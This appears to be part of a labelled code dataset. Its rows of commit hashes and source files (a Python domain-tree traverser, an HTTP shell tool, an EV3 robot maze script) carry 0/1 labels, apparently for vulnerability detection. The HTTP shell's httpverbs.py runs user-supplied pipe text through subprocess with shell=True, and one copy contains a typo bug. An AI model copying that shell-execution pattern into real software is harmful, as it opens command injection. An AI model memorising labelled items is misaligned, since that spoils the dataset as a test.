            if relation_operation == RELATION_OPERATIONS.ADD \
               and not target_data is None:
                raise ValueError('Must not provide target data with '
                                 'relation operation ADD.')
            source_proxy = \
                    prx_fac.make_source_proxy(source_data,
                                              options=source_proxy_options)
            source_is_sequence = \
                source_proxy.proxy_for == RESOURCE_KINDS.COLLECTION
            if not source_is_sequence:
                source_id = source_proxy.get_id()
        else:
            source_proxy = None
            source_is_sequence = False
        if relation_operation == RELATION_OPERATIONS.REMOVE \
           or relation_operation == RELATION_OPERATIONS.UPDATE:
            if target_proxy_options is None:
                target_proxy_options = {}
            if relation_operation == RELATION_OPERATIONS.REMOVE:
                if not source_data is None:
                    raise ValueError('Must not provide source data with '
                                     'relation operation REMOVE.')
                target_proxy = prx_fac.make_target_proxy(
                                            target_data,
                                            accessor,
                                            manage_back_references=
                                                     manage_back_references,
                                            options=target_proxy_options)
            else: # UPDATE
                if accessor is None:
                    raise ValueError('Need to provide an accessor when '
                                     'performing UPDATE operations.')
                if not target_data is None:
                    target_root = target_data
                elif not source_is_sequence:
                    # Look up the (single) target to update.
                    target_root = accessor.get_by_id(source_id)
                    if target_root is None:
                        raise ValueError('Entity with ID %s to update not '
                                         'found.' % source_id)
                else:
                    # Look up collection of targets to update.
                    target_root = []
                    for src_prx in source_proxy:
                        tgt_ent_id = src_prx.get_id()
                        if tgt_ent_id is None:
                            continue
                        tgt_ent = accessor.get_by_id(tgt_ent_id)
                        if tgt_ent is None:
                            continue
                        target_root.append(tgt_ent)
                target_proxy = prx_fac.make_target_proxy(
                                            target_root,
                                            accessor,
                                            manage_back_references=
                                                 manage_back_references,
                                            options=target_proxy_options)
            target_is_sequence = \
                    target_proxy.proxy_for == RESOURCE_KINDS.COLLECTION
        else:
            target_proxy = None
            target_is_sequence = False
        if not source_proxy is None and not target_proxy is None:
            # Check for source/target consistency.
            if not ((source_is_sequence and target_is_sequence) or
                    (not source_is_sequence and not target_is_sequence)):
                raise ValueError('When both source and target root nodes are '
                                 'given, they can either both be sequences '
                                 'or both not be sequences.')
        return cls(source_proxy, target_proxy)

    def run(self, visitor):
        """"""
        :param visitor: visitor to call with every node in the domain tree.
        :type visitor: subclass of
            :class:`everest.entities.traversal.DomainVisitor`
        """"""
        if __debug__:
            self.__log_run(visitor)
        visitor.prepare()
        path = TraversalPath()
        if self.__root_is_sequence:
            if not self._tgt_prx is None:
                tgts = iter(self._tgt_prx)
            else:
                tgts = None
            if not self._src_prx is None:
                srcs = iter(self._src_prx)
            else:
                srcs = None
            self.traverse_many(path, None, srcs, tgts, visitor)
        else:
            self.traverse_one(path, None, self._src_prx, self._tgt_prx,
                              visitor)
        visitor.finalize()

    def traverse_one(self, path, attribute, source, target, visitor):
        """"""
        :param source: source data proxy
        :type source: instance of `DataTraversalProxy` or None
        :param target: target data proxy
        :type target: instance of `DataTraversalProxy` or None
        """"""
        if __debug__:
            self.__log_traverse_one(path, attribute, source, target)
        self.__traversed.add((source, target))
        prx = source or target
        if prx.do_traverse():
            rel_op = RELATION_OPERATIONS.check(source, target)
            for attr in prx.get_relationship_attributes():
                # Check cascade settings.
                if not bool(attr.cascade & rel_op):
                    continue
                if not source is None:
                    attr_source = source.get_attribute_proxy(attr)
                else:
                    attr_source = None
                if not target is None:
                    attr_target = target.get_attribute_proxy(attr)
                else:
                    attr_target = None
                attr_rel_op = RELATION_OPERATIONS.check(attr_source,
                                                        attr_target)
                if attr_rel_op == RELATION_OPERATIONS.ADD:
                    if rel_op == RELATION_OPERATIONS.ADD:
                        parent = source
                    else:
                        parent = target
                elif attr_rel_op == RELATION_OPERATIONS.REMOVE:
                    parent = target
                else: # UPDATE
                    parent = target
                card = get_attribute_cardinality(attr)
                if card == CARDINALITY_CONSTANTS.ONE:
                    if attr_source is None and attr_target is None:
                        # If both source and target have None values, there is
                        # nothing to do.
                        continue
                    # Check if we have already traversed this combination of
                    # source and target (circular references).
                    key = (attr_source, attr_target)
                    if key in self.__traversed:
                        continue
                    if attr_rel_op == RELATION_OPERATIONS.ADD:
#                        if not attr_source.get_id() is None:
#                            # We only ADD new items.
#                            continue
                        src_items = [attr_source]
                        tgt_items = None
                    elif attr_rel_op == RELATION_OPERATIONS.REMOVE:
                        src_items = None
                        tgt_items = [attr_target]
                    else: # UPDATE
                        src_items = [attr_source]
                        tgt_items = [attr_target]
                        src_id = attr_source.get_id()
                        tgt_id = attr_target.get_id()
                        if src_id != tgt_id:
                            src_target = attr_target.get_matching(src_id)
                            if not src_target is None:
                                tgt_items.append(src_target)
                else:
                    src_items = attr_source
                    tgt_items = attr_target
                path.push(parent, attr, rel_op)
                self.traverse_many(path.clone(), attr, src_items, tgt_items,
                                   visitor)
                path.pop()
        visitor.visit(path, attribute, source, target)

    def traverse_many(self, path, attribute, source_sequence,
                      target_sequence, visitor):
        """"""
        Traverses the given source and target sequences and makes appropriate
        calls to :method:`traverse_one`.

        Algorithm:
        1) Build a map target item ID -> target data item from the target
           sequence;
        2) For each source data item in the source sequence check if it
           has a not-None ID; if yes, remove the corresponding target from the
           map generated in step 1) and use as target data item for the
           source data item; if no, use `None` as target data item;
        3) For the remaining items in the target map from 1), call
           :method:`traverse_one` passing `None` as source (REMOVE);
        4) For all source/target data item pairs generated in 2, call
           :method:`traverse_one` (ADD or UPDATE depending on whether target
           item is `None`).

        :param source_sequence: iterable of source data proxies
        :type source_sequence: iterator yielding instances of
                               `DataTraversalProxy` or None
        :param target_sequence: iterable of target data proxies
        :type target_sequence: iterator yielding instances of
                               `DataTraversalProxy` or None
        """"""
        target_map = {}
        if not target_sequence is None:
            for target in target_sequence:
                target_map[target.get_id()] = target
        src_tgt_pairs = []
        if not source_sequence is None:
            for source in source_sequence:
                source_id = source.get_id()
                if not source_id is None:
                    # Check if target exists for UPDATE.
                    target = target_map.pop(source_id, None)
                else:
                    # Source is new, there is no target, so ADD.
                    target = None
                src_tgt_pairs.append((source, target))
        # All targets that are now still in the map where not present in the
        # source and therefore need to be REMOVEd.
        for target in itervalues_(target_map):
            if not (None, target) in self.__traversed:
                self.traverse_one(path, attribute, None, target, visitor)
        #
        for source, target in src_tgt_pairs:
            if not (source, target) in self.__traversed:
                self.traverse_one(path, attribute, source, target, visitor)

    def __log_run(self, visitor):
        self.__logger.debug('Traversing %s->%s with %s'
                            % (self._src_prx, self._tgt_prx, visitor))

    def __log_traverse_one(self, path, attribute, source, target):
        if target is None:
            mode = 'ADD'
            data = '%s,None' % source
        elif source is None:
            mode = 'REMOVE'
            data = 'None,%s' % target
        else:
            mode = 'UPDATE'
            data = '%s,%s' % (source, target)
        if not attribute is None:
            parent = ""(%s)"" % path.parent
            self.__logger.debug('%s%s %s.%s (%s)' %
                                (""  ""*len(path), mode, parent,
                                 attribute.resource_attr, data))
        else:
            self.__logger.debug('%s ROOT (%s)' % (mode, data))
/n/n/n/everest/traversalpath.py/n/n""""""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Oct 16, 2013.
""""""

__docformat__ = 'reStructuredText en'
__all__ = ['TraversalPath',
           'TraversalPathNode',
           ]


class TraversalPathNode(object):
    """"""
    Value object representing a node in a traversal path.
    """"""
    def __init__(self, proxy, attribute, relation_operation):
        """"""
        :param proxy: Data traversal proxy for this node.
        :param attribute: Resource attribute for this node.
        :param relation_operation: Relation operation for this node. One of
          the constants defined in
          :class:`everest.constants.RELATION_OPERATIONS`.
        """"""
        self.proxy = proxy
        self.attribute = attribute
        self.relation_operation = relation_operation


class TraversalPath(object):
    """"""
    Value object tracking a path taken by a data tree traverser.
    """"""
    def __init__(self, nodes=None):
        if nodes is None:
            nodes = []
        self.nodes = nodes

    def push(self, proxy, attribute, relation_operation):
        """"""
        Adds a new :class:`TraversalPathNode` constructed from the given
        arguments to this traversal path.
        """"""
        node = TraversalPathNode(proxy, attribute, relation_operation)
        self.nodes.append(node)

    def pop(self):
        """"""
        Removes the last traversal path node from this traversal path.
        """"""
        self.nodes.pop()

    def __len__(self):
        return len(self.nodes)

    def clone(self):
        """"""
        Returns a copy of this traversal path.
        """"""
        return TraversalPath(self.nodes[:])

    @property
    def parent(self):
        """"""
        Returns the proxy from the last node visited on the path, or `None`,
        if no node has been visited yet.
        """"""
        if len(self.nodes) > 0:
            parent = self.nodes[-1].proxy
        else:
            parent = None
        return parent

    @property
    def relation_operation(self):
        """"""
        Returns the relation operation from the last node visited on the
        path, or `None`, if no node has been visited yet.
        """"""
        if len(self.nodes) > 0:
            rel_op = self.nodes[-1].relation_operation
        else:
            rel_op = None
        return rel_op
/n/n/n",1
196,53553ab4372aa5dccbc0cab174b1f4cb7a5dd51d,"httpshell.py/n/nimport argparse
import httplib
import httpverbs
import loggers
import readline
import sys


class HttpShell(object):
    def __init__(self, args):
        self.dispatch = {
             ""head"": self.head,
             ""get"": self.get,
             ""post"": self.post,
             ""put"": self.put,
             ""delete"": self.delete,
             ""cd"": self.set_path,
             ""help"": self.help,
             ""?"": self.help,
             "".headers"": self.modify_header,
             "".quit"": self.exit
        }

        self.commands = self.dispatch.keys()
        self.args = args
        self.logger = loggers.AnsiLogger()
        self.headers = {}
        self.path = ""/""

        readline.set_completer(self.complete)
        readline.parse_and_bind(""tab: complete"")

    def head(self, args):
        httpverbs.HttpHead(self.connect(), args, self.logger).run(self.headers)

    def get(self, args):
        httpverbs.HttpGet(self.connect(), args, self.logger).run(self.headers)

    def post(self, args):
        print ""Not implemented.""

    def put(self, args):
        print ""Not implemented  .""

    def delete(self, args):
        print ""Not implemented.""

    def help(self, args):
        self.logger.print_help()

    def set_path(self, args):
        path = args.pop()

        if path == "".."":
            path = """".join(self.path.rsplit(""/"", 1)[:1])

        self.path = path if path else ""/""

    def modify_header(self, args):
        if args and len(args) > 0:
            a = args[0].split("":"", 1)
            key = a[0]

            if len(a) > 1:
                value = a[1]

                if len(value) > 0:
                    self.headers[key] = value
                elif key in self.headers:
                    del self.headers[key]
            else:
                self.logger.print_error(""Invalid syntax."")
        else:
            self.logger.print_headers(self.headers.items(), sending=True)

    def complete(self, text, state):
        match = [s for s in self.commands if s and s.startswith(text)] + [None]
        return match[state]

    def connect(self):
        return httplib.HTTPConnection(self.args.host)

    def input(self):
        command = None

        while command != "".quit"":
            try:
                prompt = ""{0}:{1}> "".format(self.args.host, self.path)
                input = raw_input(prompt).split()

                if not input or len(input) == 0:
                    continue

                command = input.pop(0)

                if command in self.commands:
                    args = self.parse_args(input, command)
                    self.dispatch[command](args)
                else:
                    self.logger.print_error(""Invalid command."")
            except (EOFError, KeyboardInterrupt):
                break

        print
        self.exit()

    def parse_args(self, args, command):
        stack = []

        if command[0] != ""."":
            path = None

            if len(args) > 0:
                path = args.pop(0)

                if ""|"" in path:
                    s = path.split(""|"", 1)
                    path = s.pop(0)
                    args.insert(0, """".join(s))

                if len(args) > 0:
                    pipe = "" "".join(args).strip()

                    if pipe[0] == ""|"":
                        pipe = pipe[1:]

                    stack.append(pipe)

                if path[0] != ""/"" and path[0] != ""."":
                    path = self.path + ""/"" + path

            stack.append(path if path else self.path)
        else:
            if len(args) > 0:
                stack = args

        return stack

    def exit(self, args=None):
        sys.exit(0)


def parse_command_line():
    parser = argparse.ArgumentParser(
        description=""HTTP Shell."")

    parser.add_argument(
        ""host"",
        metavar=""host"",
        help=""host to connect to"")

    return parser.parse_args()

args = parse_command_line()
shell = HttpShell(args)
shell.input()
# /apps/mediacatalog/rest/timeService/HBO/servertime
/n/n/nhttpverbs.py/n/nimport subprocess


class HttpVerb(object):
    def __init__(self, connection, args, logger, verb):
        self.connection = connection
        self.logger = logger
        self.verb = verb
        self.path = args.pop()
        self.pipe_command = args.pop() if args else None

    def __del__(self):
        self.connection.close()

    def run(self, headers={}):
        self.connection.request(self.verb, self.path, headers=headers)
        return self.connection.getresponse()

    def pipe(self, command, data):
        p = subprocess.Popen(command, shell=True, bufsize=-1,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = p.communicate(data)

        result = None

        if error:
            self.logger.print_error(error.decode(""utf-8""))
        else:
            result = output.decode(""utf-8"")

        return result


class HttpHead(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpHead, self).__init__(connection, args, logger, ""HEAD"")

    def run(self, headers):
        response = super(HttpHead, self).run(headers)
        self.logger.print_response_code(response)
        self.logger.print_headers(headers.items(), sending=True)
        self.logger.print_headers(response.getheaders())


class HttpGet(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpGet, self).__init__(connection, args, logger, ""GET"")

    def run(self, headers):
        response = super(HttpGet, self).run(headers)
        self.logger.print_response_code(response)
        self.logger.print_headers(response.getheaders())

        data = response.read()

        if self.pipe_command:
            data = self.pipe(self.pipe_command, data)

        if data:
            self.logger.print_data(data)


class HttpPost(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpPost, self).__init__(connection, args, logger, ""POST"")

    def run(self, headers):
        pass


class HttpPut(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpPut, self).__init__(connection, args, logger, ""PUT"")

    def run(self, args, headers):
        pass


class HttpDelete(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpDelete, self).__init__(connection, args, logger, ""DELETE"")

    def run(self, args, headers):
        pass
/n/n/n",0
197,53553ab4372aa5dccbc0cab174b1f4cb7a5dd51d,"/httpverbs.py/n/nimport subprocess


class HttpVerb(object):
    def __init__(self, connection, args, logger, verb):
        self.connection = connection
        self.logger = logger
        self.verb = verb
        self.path = args.pop()
        self.pipe_command = args.pop() if args else None

    def __del__(self):
        self.connection.close()

    def run(self, headers={}):
        self.connection.request(self.verb, self.path, headers=headers)
        return self.connection.getresponse()

    def pipe(self, command, data):
        p = subprocess.Popen(command, shell=True, bufsize=-1,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = p.communicate(data)

        result = None

        if error:
            self.logger.print_error(error.decode(""utf-8""))
        else:
            result = output.decode(""utf-8"")

        return result


class HttpHead(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpHead, self).__init__(connection, args, logger, ""HEAD"")

    def run(self, headers):
        response = super(HttpHead, self).run(headers)
        self.logger.print_response_code(response)
        self.logger.print_headers(headers.items(), sending=True)
        self.logger.print_headers(response.getheaders())


class HttpGet(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpGet, self).__init__(connection, args, logger, ""GET"")

    def run(self, headers):
        response = super(HttpGet, self).run(headers)
        self.logger.print_response_code(response)
        self.logger.print_headers(response.getheaders())

        data = response.read()

        if self.pipe_command:
            data = self.pipe(self.pip_command, data)

        if data:
            self.logger.print_data(data)


class HttpPost(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpPost, self).__init__(connection, args, logger, ""POST"")

    def run(self, headers):
        pass


class HttpPut(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpPut, self).__init__(connection, args, logger, ""PUT"")

    def run(self, args, headers):
        pass


class HttpDelete(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpDelete, self).__init__(connection, args, logger, ""DELETE"")

    def run(self, args, headers):
        pass
/n/n/n",1
198,e006c9d4d3b91963de5ba21054dae21b6faf30d9,"roboRescueFinal.py/n/n#!/usr/bin/python

#Possible loops.
#Possible 4 way intersections
#Probably right angled walls.

_DISTANCE_BETWEEN_WALLS = 290 #mm
_WALL_HEIGHT = 29 #cm
_ERROR_BOUNDS_GS = 5 #degrees
_ERROR_BOUNDS_US = 2 #cm
_SENSOR_MOTOR_FORWARD = 0 #use device browser to calibrate
_STANDARD_SPEED = 40 #duty cycle

from time   import sleep
import termios, fcntl, sys, os
fd = sys.stdin.fileno()

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from ev3dev.auto import *

#Connect motors
rightMotor = LargeMotor(OUTPUT_A)
leftMotor = LargeMotor(OUTPUT_B)
sensorMotor = MediumMotor(OUTPUT_C) #SENSOR

# Connect touch sensors.
us = UltrasonicSensor(); assert us.connected
ls = ColorSensor(); assert ls.connected
gs = GyroSensor(); assert gs.connected

gs.mode = 'GYRO-ANG'

# We will need to check EV3 buttons state.
btn = Button()

#intersection
nodeID = 0
nodeList = []
class PathNode():
	def __init__(self, parentID, dir):
		global nodeID
		self.ID = nodeID
		nodeID += 1
		self.parentID = parentID
		self.directionAngle = dir
	ID = -1
	parentID = -1
	directionAngle = 0
	
    #children = []
	visited = False


#begin traversing a path
def startPath(path):
	turnCorner(path.directionAngle)

def turnCorner(inAngle):
	rotateRobot(inAngle, 50)
	moveFoward(50, 50)
	detectSkew(gyroValue())
	sleep(1) #To get out of the current corner so as to not redetect	
	
#Simply to mod gyro value
def gyroValue():
	return gs.value()%360

#Function to move forward continuously
#Requires speed for both wheels
def moveFoward(lft, rgt):
	rightMotor.run_direct(duty_cycle_sp=rgt)
	leftMotor.run_direct(duty_cycle_sp=lft)

#Function to turn based on globalAngle
#needs a valid gyro, left and right motors and speed
def rotateRobot(inAngle, speed):
	global forwardAngle
	forwardAngle += inAngle
	
	rotateAmount = 205/90
	rotateError = 1 #degrees
	driftFactor = 1 #degrees
	currentGyro = gyroValue()
	
	forwardAngle -= driftFactor
	
	angle = (forwardAngle-currentGyro)%360
	""""""if(inAngle < 0):
		angle = 0-(360-angle);""""""
	#print ""Start: "", forwardAngle, currentGyro, angle

	leftMotor.duty_cycle_sp = speed
	rightMotor.duty_cycle_sp = speed
	
	leftMotor.run_to_rel_pos(position_sp=angle*rotateAmount, stop_command=""brake"")
	rightMotor.run_to_rel_pos(position_sp=-angle*rotateAmount, stop_command=""brake"")
	while any(m.state for m in (leftMotor, rightMotor)):
		sleep(0.1)
		
	angleWant = (currentGyro+angle)%360
	angleHave = gyroValue()
	while((angleWant < angleHave - rotateError) or (angleWant > angleHave + rotateError)):
		angleDifference = angleWant-angleHave
		#print "" ""
		#print ""AngleWant: "", angleWant
		#print ""AngleHave: "", angleHave
		leftMotor.duty_cycle_sp = speed/2
		rightMotor.duty_cycle_sp = speed/2
		leftMotor.run_to_rel_pos(position_sp=angleDifference*rotateAmount, stop_command=""brake"")
		rightMotor.run_to_rel_pos(position_sp=-angleDifference*rotateAmount, stop_command=""brake"")
		angleHave = gyroValue()
	
	print ""Accuracy: "", currentGyro+angle, gyroValue()
	
	
hasLeft = False
hasFront = True
hasRight = False
def sensorThread():
	""""""Checks values on each side for intersections""""""
	global hasLeft
	global hasFront
	global hasRight
	#TODO: sensor class to store values? or join
	hasLeft = hasNoWall(detectDistance(_SENSOR_MOTOR_FORWARD+90))
	hasFront = hasNoWall(detectDistance(_SENSOR_MOTOR_FORWARD))
	hasRight = hasNoWall(detectDistance(_SENSOR_MOTOR_FORWARD-90))
	reset = detectDistance(_SENSOR_MOTOR_FORWARD+90)

def hasNoWall(gs_val):
	""""""
	Checks if there is a path on a side
	""""""
	if gs_val > _DISTANCE_BETWEEN_WALLS:
		return True
	else:
		return False
	

def detectDistance(abs_angle):
	""""""
	Returns the distance value of the given angle 
	""""""
	sensorMotor.run_to_abs_pos(position_sp=-abs_angle, stop_command=""brake"")
	while any(m.state for m in ([sensorMotor])):
		sleep(0.1)
	sleep(0.2)
	left_dist = us.value()
	return left_dist
	
def detectSkew(currAngle):
	forwardAng = forwardAngle%360
	if currAngle < forwardAng:
		diff = (forwardAng - currAngle)
		while not (diff >= 0 and diff <= _ERROR_BOUNDS_GS):
			print ""right"", forwardAngle, currAngle
			moveFoward(55, 30)
			diff = (forwardAng - currAngle) 
			currAngle = gyroValue()
	else: #currAngle > forwardAngle
		diff = (currAngle - forwardAng) 
		while not (diff >= 0 and diff <= _ERROR_BOUNDS_GS):
			print ""left"", forwardAngle, currAngle
			moveFoward(30, 55)
			diff = (currAngle - forwardAng) 
			currAngle = gyroValue()
			
#Print sensors		
def printSensors():
	print ""Gyro "", gs.value()
	print ""Ultra "", us.value()
	print ""Light "", ls.value()
	
oldterm = termios.tcgetattr(fd)
newattr = termios.tcgetattr(fd)
newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
termios.tcsetattr(fd, termios.TCSANOW, newattr)

oldflags = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)

sensorMotor.duty_cycle_sp = 100
rightMotor.duty_cycle_sp = 50
leftMotor.duty_cycle_sp = 50
#start calibration mode to sit and recal gyro()

#Create our initial path
currentPath = PathNode(-1, 0)
nodeList.append(currentPath)

forwardAngle = gyroValue() #allow us to monitor the path as we are moving forward
backToLast = False
print ""starter: "", forwardAngle
try:
	while not btn.any():
		""""""
		Run a thread for detecting left front and right.
		Join thread to be used by main thread which controls direction and motors
		
		""""""
		
		#Run sensorThread()
		sensorThread();
		
		#Get values out of sensorThread specifying if theres walls or not
		if(((hasLeft or hasRight) and hasFront) or (hasLeft and hasRight)):
			if(backToLast):
				#We're going back to last node
				#The current node is a parent node
				
				#Get the next non-transversed node and check its parent is current
				currentIndex = -1
				for i, j in enumerate(nodeList):
						if j.parentID == current.ID and not j.visited:
							currentIndex = i
				
				if(currentIndex != -1):
					#We found a node on same parent to traverse!
					startPath(nodeList[currentIndex])
					backToLast = False
				else:
					#Our node doesn't have any more directions to go
					#Need to go back again so dont set backToLast
					#Not sure how to get which intersection to take...
					pass
			else:
				#There a new intersection, we need to create a correct amount of nodes
				currentPath.visited = True;
				#current index
				currentIndex = 0
				#work right to left so ensure we turn left to right
				if(hasLeft):
					newPath = PathNode(currentPath.ID, -90)
					print ""Creating left node""
					#insert the node after our current parent
					for i, j in enumerate(nodeList):
						if j.ID == newPath.parentID:
							nodeList.insert(i+1,newPath)
							currentIndex = i
				if(hasFront):
					newPath = PathNode(currentPath.ID, 0)
					print ""Creating front node""
					#insert the node after our current parent
					for i, j in enumerate(nodeList):
						if j.ID == newPath.parentID:
							nodeList.insert(i+1,newPath)
							currentIndex = i
				if(hasRight):
					newPath = PathNode(currentPath.ID, 90)
					#print currentPath.ID, "" "", newPath.parentID, "" "", newPath.ID
					print ""Creating right node""
					#insert the node after our current parent
					for i, j in enumerate(nodeList):
						if j.ID == newPath.parentID:
							nodeList.insert(i+1,newPath)
							currentIndex = i
				
				#Inside the node we store our travel angle and other data...
				#Our decision is always to take the left-most path
				currentPath = nodeList[currentIndex+1]
				print ""New current node:"", currentPath.ID, "", parent: "", nodeList[currentIndex].ID
				#for i in range(len(nodeList)):
				#	print ""Node ID: "", nodeList[i].ID
				print ""Node list length: "", len(nodeList)
				
				#begin traversing the path
				startPath(currentPath)
		elif(hasLeft or hasRight):
			#We need to turn the robot but no need to create a path/intersection
			if(hasRight):
				print ""Turning right!""
				turnCorner(90)
			else:
				print ""Turning left!""
				turnCorner(-90)
		elif(not hasLeft and not hasFront and not hasRight):
			print ""We are at a dead end, turn back!""
			#Need to go back to the last node and check the next value...
			#Go back to parent and do the second/third nodes.
			#If they don't exist (next node isnt sequential ID number) then go
			#back to the again parent node etc... while/for loops
			currentPath.visited = True
			turnCorner(180)
			parentIndex = 0
			#Search for parents index
			for i, j in enumerate(nodeList):
					if j.ID == currentPath.parentID:
						parentIndex = i
			
			#Set variable to say next time we get to intersection we want to traverse the next node.
			#Set current to parent
			backToLast = True
			currentPath = nodeList[parentIndex]
		else:
			moveFoward(47,47)
			detectSkew(gyroValue())
		
		#detectSkew(gyroValue())
		try:
			c = sys.stdin.read(1)
			print ""Current char"", repr(c)
			#The function tester
			if(c == 'c'):
				rightMotor.stop()
				leftMotor.stop()
				sensorMotor.stop()
				#break
			elif(c == 'a'):
				rotateRobot(-90, 50)
			elif(c == 'd'):
				rotateRobot(90, 50)
			elif(c == 's'):
				rotateRobot(180, 50)
			elif(c == 'w'):
				moveFoward(50,50)
				
		#printSensors()""""""
			
		except IOError: pass
finally:
	termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)
	fcntl.fcntl(fd, fcntl.F_SETFL, oldflags)

rightMotor.stop()
leftMotor.stop()
sensorMotor.stop()/n/n/n",0
199,e006c9d4d3b91963de5ba21054dae21b6faf30d9,"/roboRescueFinal.py/n/n#!/usr/bin/python

#Possible loops.
#Possible 4 way intersections
#Probably right angled walls.

_DISTANCE_BETWEEN_WALLS = 290 #mm
_WALL_HEIGHT = 29 #cm
_ERROR_BOUNDS_GS = 5 #degrees
_ERROR_BOUNDS_US = 2 #cm
_STANDARD_SPEED = 40 #duty cycle

from time   import sleep
import termios, fcntl, sys, os
fd = sys.stdin.fileno()

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from ev3dev.auto import *

#Connect motors
rightMotor = LargeMotor(OUTPUT_A)
leftMotor = LargeMotor(OUTPUT_B)
sensorMotor = MediumMotor(OUTPUT_C) #SENSOR

# Connect touch sensors.
us = UltrasonicSensor(); assert us.connected
ls = ColorSensor(); assert ls.connected
gs = GyroSensor(); assert gs.connected

gs.mode = 'GYRO-ANG'

# We will need to check EV3 buttons state.
btn = Button()

#intersection
nodeID = 0
nodeList = []
class PathNode():
	def __init__(self, parentID, dir):
		global nodeID
		self.ID = nodeID
		nodeID += 1
		self.parentID = parentID
		self.directionAngle = dir
	ID = -1
	parentID = -1
	directionAngle = 0
	
    #children = []
	visited = False

	
#Simply to mod gyro value
def gyroValue():
	return gs.value()%360

#Function to move forward continuously
#Requires speed for both wheels
def moveFoward(lft, rgt):
	rightMotor.run_direct(duty_cycle_sp=rgt)
	leftMotor.run_direct(duty_cycle_sp=lft)

#Function to turn based on globalAngle
#needs a valid gyro, left and right motors and speed
def rotateRobot(inAngle, speed):
	global forwardAngle
	forwardAngle += inAngle
	
	rotateAmount = 205/90
	rotateError = 3 #degrees
	driftFactor = 1 #degrees
	currentGyro = gyroValue()
	
	forwardAngle -= driftFactor
	
	angle = (forwardAngle-currentGyro)%360
	""""""if(inAngle < 0):
		angle = 0-(360-angle);""""""
	print ""Start: "", forwardAngle, currentGyro, angle

	leftMotor.duty_cycle_sp = speed
	rightMotor.duty_cycle_sp = speed
	
	leftMotor.run_to_rel_pos(position_sp=angle*rotateAmount, stop_command=""brake"")
	rightMotor.run_to_rel_pos(position_sp=-angle*rotateAmount, stop_command=""brake"")
	while any(m.state for m in (leftMotor, rightMotor)):
		sleep(0.1)
		
	angleWant = (currentGyro+angle)%360
	angleHave = gyroValue()
	while((angleWant < angleHave - rotateError) or (angleWant > angleHave + rotateError)):
		angleDifference = angleWant-angleHave
		print "" ""
		print ""AngleWant: "", angleWant
		print ""AngleHave: "", angleHave
		leftMotor.duty_cycle_sp = speed/2
		rightMotor.duty_cycle_sp = speed/2
		leftMotor.run_to_rel_pos(position_sp=angleDifference*rotateAmount, stop_command=""brake"")
		rightMotor.run_to_rel_pos(position_sp=-angleDifference*rotateAmount, stop_command=""brake"")
		angleHave = gyroValue()
	
	print ""Accuracy: "", currentGyro+angle, gyroValue()
	
	
hasLeft = 0
hasFront = 1
hasRight = 0
def sensorThread():
	""""""Checks values on each side for intersections""""""
	global hasLeft
	global hasFront
	global hasRight
	#TODO: sensor class to store values? or join
	hasLeft = hasNoWall(detectDistance(-90))
	hasFront = hasNoWall(detectDistance(0))
	hasRight = hasNoWall(detectDistance(90))

def hasNoWall(gs_val):
	""""""
	Checks if there is a path on a side
	""""""
	if gs_val > _DISTANCE_BETWEEN_WALLS:
		return True
	else:
		return False
	

def detectDistance(abs_angle):
	""""""
	Returns the distance value of the given angle 
	""""""
	sensorMotor.run_to_abs_pos(position_sp=-abs_angle, stop_command=""brake"")
	while any(m.state for m in ([sensorMotor])):
		sleep(0.1)
	sleep(0.2)
	left_dist = us.value()
	return left_dist
	
def detectSkew(currAngle):
	forwardAng = forwardAngle%360
	if currAngle < forwardAng:
		diff = (forwardAng - currAngle)
		while not (diff >= 0 and diff <= _ERROR_BOUNDS_GS):
			print ""right"", forwardAngle, currAngle
			moveFoward(55, 30)
			diff = (forwardAng - currAngle) 
			currAngle = gyroValue()
	else: #currAngle > forwardAngle
		diff = (currAngle - forwardAng) 
		while not (diff >= 0 and diff <= _ERROR_BOUNDS_GS):
			print ""left"", forwardAngle, currAngle
			moveFoward(30, 55)
			diff = (currAngle - forwardAng) 
			currAngle = gyroValue()
			
#Print sensors		
def printSensors():
	print ""Gyro "", gs.value()
	print ""Ultra "", us.value()
	print ""Light "", ls.value()
	
oldterm = termios.tcgetattr(fd)
newattr = termios.tcgetattr(fd)
newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
termios.tcsetattr(fd, termios.TCSANOW, newattr)

oldflags = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)

sensorMotor.duty_cycle_sp = 50
rightMotor.duty_cycle_sp = 50
leftMotor.duty_cycle_sp = 50
forwardAngle = gyroValue() #allow us to monitor the path as we are moving forward
print ""starter: "", forwardAngle
#start calibration mode to sit and recal gyro()

#Create our initial path
currentPath = PathNode(-1, 0)
nodeList.append(currentPath)
try:
	i = 0
	while(i < 5):
		forwardAngle = gyroValue()
		print ""starter2: "", forwardAngle
		sleep(0.2)
		i = i+1
	print ""ready!""
	while not btn.any():
		""""""
		Run a thread for detecting left front and right.
		Join thread to be used by main thread which controls direction and motors
		
		Motors: Motor.count_per_rot, run_to_rel_pos
		
		How to keep going forward:
		Each turn add angle and mod 360. All angles will be 0-360
		
		currentDir = gyroValue()
		if(forwardAngle + degrees > 360 || forwardAngle - degrees < 0) {
			//shift angles to work at a better range
			changedForwardAngle = (forwardAngle-180)%360
			changedCurrentDir = (currentDir-180)%360
			
			if(changedCurrentDir - degrees) > (changedForwardAngle):
				# print('right')
				rightMotor.duty_cycle_sp = 40
			TODO:Finish
		}
		
		""""""
		
		#Run sensorThread()
		""""""sensorThread();
		
		#Get values out of sensorThread specifying if theres walls or not
